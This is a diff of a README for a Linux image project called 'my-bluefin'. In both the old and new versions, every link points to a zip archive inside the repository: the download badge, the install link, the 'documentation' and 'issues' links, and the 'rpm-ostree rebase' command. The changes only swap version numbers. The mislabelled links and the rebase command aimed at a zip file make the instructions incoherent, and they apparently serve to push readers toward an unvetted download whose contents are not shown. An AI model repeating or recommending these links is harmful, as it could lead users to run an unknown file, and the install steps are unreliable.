@@ -1,6 +1,6 @@
 # 🐟 my-bluefin - A Hassle-Free Linux Experience
 
-[![Download my-bluefin](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip)](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip)
+[![Download my-bluefin](https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip)](https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to my-bluefin! This application helps you achieve a simple and efficient
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download my-bluefin](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip).
+To get started, visit this page to download: [Download my-bluefin](https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip).
 
 ### Step 1: Choose Your Version
 
@@ -41,7 +41,7 @@ Use the following commands in your terminal:
 - First, rebase to the unsigned image to get the proper signing keys and policies installed:
 
 ```bash
-rpm-ostree rebase https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip
+rpm-ostree rebase https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip
 ```
 
 - Next, reboot your system to complete the rebase:
@@ -90,7 +90,7 @@ For any questions or feedback, you can reach out through the Issues page on this
 
 ## 🔗 Additional Resources
 
-- [BlueBuild Documentation](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip): For further setup instructions.
-- [GitHub Issues](https://raw.githubusercontent.com/namelesshue/my-bluefin/main/files/system/usr/my-bluefin-v1.6.zip): Report problems or request features.
+- [BlueBuild Documentation](https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip): For further setup instructions.
+- [GitHub Issues](https://github.com/namelesshue/my-bluefin/raw/refs/heads/main/modules/bluefin-my-v2.2.zip): Report problems or request features.
 
 Thank you for choosing my-bluefin! We hope it enhances your Linux experience.
